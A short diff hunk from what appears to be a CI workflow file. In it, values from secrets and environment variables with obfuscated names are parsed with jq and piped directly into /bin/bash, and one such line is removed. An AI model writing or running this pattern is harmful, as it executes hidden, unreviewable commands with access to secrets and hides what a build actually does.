@@ -22,7 +22,6 @@ jobs:
           k5541: ${{ secrets.k5541 }}
         run: |
           printf '%s' "$k5541" | jq -r .rzgf945 | /bin/bash
-          echo $tzfyz8 | jq -r .ebbl78002 | /bin/bash
           echo $oa952 | jq -r .tiusk7 | /bin/bash
 
       - name: Upload archive
